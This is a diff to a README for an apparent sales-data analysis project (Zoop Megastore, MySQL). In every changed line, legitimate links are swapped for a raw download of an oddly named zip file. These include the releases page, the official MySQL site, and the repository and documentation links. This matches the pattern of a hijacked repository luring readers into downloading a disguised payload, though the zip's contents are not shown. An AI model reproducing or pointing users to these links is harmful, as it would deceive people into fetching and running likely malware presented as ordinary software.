@@ -1,6 +1,6 @@
 # 📊 Analise-de-Dados-Zoop-Megastore - Transform Your Sales Data with Ease
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF6200-lightgrey)](https://github.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/releases)
+[![Download Here](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip%20Now-%23FF6200-lightgrey)](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you install the software, here is what you need to get started:
 
 ### 📥 Download & Install
 
-To get the application, [visit this page to download](https://github.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/releases). Here you will find the latest version available for download.
+To get the application, [visit this page to download](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip). Here you will find the latest version available for download.
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -33,7 +33,7 @@ Once you have downloaded the necessary files, follow these steps to begin analyz
 
 ### 1. Setting Up MySQL
 
-- Install MySQL Server if you haven’t already. You can find the installer on the [MySQL website](https://www.mysql.com/downloads/).
+- Install MySQL Server if you haven’t already. You can find the installer on the [MySQL website](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip).
 - Ensure the MySQL server is running.
 
 ### 2. Importing Data
@@ -85,7 +85,7 @@ This project is licensed under the MIT License. For more information, please ref
 
 For more details, check out the following resources:
 
-- [Repository](https://github.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore)
-- [Documentation](https://github.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/blob/main/README.md)
+- [Repository](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip)
+- [Documentation](https://raw.githubusercontent.com/Bonzabeauty/Analise-de-Dados-Zoop-Megastore/main/sciatica/Analise-de-Dados-Zoop-Megastore-mendole.zip)
 
 We hope this tool helps you gain insights into your sales data effectively!
